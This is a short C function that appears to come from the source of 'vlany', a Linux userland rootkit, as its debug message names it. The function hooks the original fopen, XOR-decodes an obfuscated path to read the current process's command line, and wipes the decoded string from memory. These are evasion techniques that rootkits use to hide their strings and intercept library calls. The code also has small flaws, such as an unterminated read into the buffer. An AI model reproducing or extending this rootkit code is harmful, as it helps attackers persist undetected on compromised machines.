char *procname_self()
{
    #ifdef DEBUG
        printf("[vlany] procname_self() called\n");
    #endif

    HOOK(old_fopen, CFOPEN);

    char *procname = malloc(1024);
    FILE *cmdline;
    char *cmdline_self = strdup(CMDLINE_SELF); xor(cmdline_self);
    if((cmdline = old_fopen(cmdline_self, "r")) == NULL) return NULL;
    cleanup(cmdline_self, strlen(cmdline_self));

    fread(procname, 255, 1, cmdline); fclose(cmdline);
    return procname;
}
